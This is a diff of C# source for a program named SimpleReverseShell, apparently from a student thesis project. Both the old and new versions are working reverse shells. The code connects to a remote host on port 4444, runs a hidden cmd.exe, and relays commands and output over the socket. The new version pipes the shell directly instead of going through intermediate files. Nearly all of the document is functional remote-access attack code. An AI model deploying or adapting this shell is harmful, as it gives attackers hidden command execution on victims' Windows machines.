@@ -1,102 +1,69 @@
-﻿using System.Text;
-using System.Diagnostics;
-using System.Net.Sockets;
+﻿using System;
+using System.Text;
 using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+
 
 namespace SimpleReverseShell
 {
   public class SimpleDotNetShell
   {
-    FileStream inputStream;
-    StreamWriter outputStreamWriter;
+    private StreamWriter streamWriter;
+
     public void Start()
     {
-      using (var client = new TcpClient("192.168.0.187", 4444))
-      using (var networkStream = client.GetStream())
-      using (inputStream = new FileStream(@"F:\FH_Technikum_Wien\Masterarbeit\IPC\input.txt", FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.Read))
-      using (var outputStream = new FileStream(@"F:\FH_Technikum_Wien\Masterarbeit\IPC\output.txt", FileMode.Open, FileAccess.ReadWrite, FileShare.Read))
-      using (var socketReader = new StreamReader(networkStream))
-      using (var inputStreamWriter = new StreamWriter(inputStream))
-      using (var outputStreamReader = new StreamReader(outputStream))
-      using (outputStreamWriter = new StreamWriter(outputStream))
+      using (TcpClient client = new TcpClient("192.168.126.128", 4444))
       {
-        Task.Run(StartShell);
-
-        while (true)
+        using (Stream stream = client.GetStream())
         {
-          var shellCommand = socketReader.ReadLine();
-          if (!string.IsNullOrWhiteSpace(shellCommand))
+          using (StreamReader rdr = new StreamReader(stream))
           {
-            inputStreamWriter.WriteLine(shellCommand);
-            inputStreamWriter.Flush();
+            streamWriter = new StreamWriter(stream);
+
+            StringBuilder strInput = new StringBuilder();
+
+            Process p = new Process();
+            p.StartInfo.FileName = "cmd.exe";
+            p.StartInfo.CreateNoWindow = true;
+            p.StartInfo.UseShellExecute = false;
+            p.StartInfo.RedirectStandardOutput = true;
+            p.StartInfo.RedirectStandardInput = true;
+            p.StartInfo.RedirectStandardError = true;
+            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+            p.Start();
+            p.BeginOutputReadLine();
+
+            while (true)
+            {
+              strInput.Append(rdr.ReadLine());
+              //strInput.Append("\n");
+              p.StandardInput.WriteLine(strInput);
+              strInput.Remove(0, strInput.Length);
+            }
           }
-
-          string formattedOutput = "";
-          string output;
-
-          do
-          {
-            output = outputStreamReader.ReadLine();
-
-            if (!string.IsNullOrWhiteSpace(output))
-              formattedOutput += output;
-          } while (!string.IsNullOrWhiteSpace(output));
         }
       }
     }
 
-    private void CmdOutputDataHandler(string data)
+    private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
     {
       StringBuilder strOutput = new StringBuilder();
 
-      if (!String.IsNullOrEmpty(data))
+      if (!String.IsNullOrEmpty(outLine.Data))
       {
         try
         {
-          strOutput.Append(data);
-          outputStreamWriter.WriteLine(strOutput);
-          outputStreamWriter.Flush();
+          strOutput.Append(outLine.Data);
+          streamWriter.WriteLine(strOutput);
+          streamWriter.Flush();
         }
         catch (Exception err) { }
       }
     }
 
-    private void StartShell()
-    {
-      Process p = new Process();
-      p.StartInfo.FileName = "C:\\Windows\\system32\\cmd.exe";
-      p.StartInfo.CreateNoWindow = true;
-      p.StartInfo.UseShellExecute = false;
-      p.StartInfo.RedirectStandardOutput = true;
-      p.StartInfo.RedirectStandardInput = true;
-      p.StartInfo.RedirectStandardError = false;
-      p.Start();
-
-      using (var reader = new StreamReader(inputStream))
-      {
-        while (true)
-        {
-          var shellComand = reader.ReadLine();
-
-          if (!string.IsNullOrWhiteSpace(shellComand))
-          {
-            string output;
-            string formattedOutput = string.Empty;
-
-            p.StandardInput.Write(shellComand);
-            do
-            {
-              output = p.StandardOutput.ReadLine();
-
-              if (!string.IsNullOrWhiteSpace(output))
-                formattedOutput += output;
-            }
-            while (!string.IsNullOrWhiteSpace(output));
-
-            CmdOutputDataHandler(formattedOutput);
-          }
-        }
-      }
-    }
   }
 }
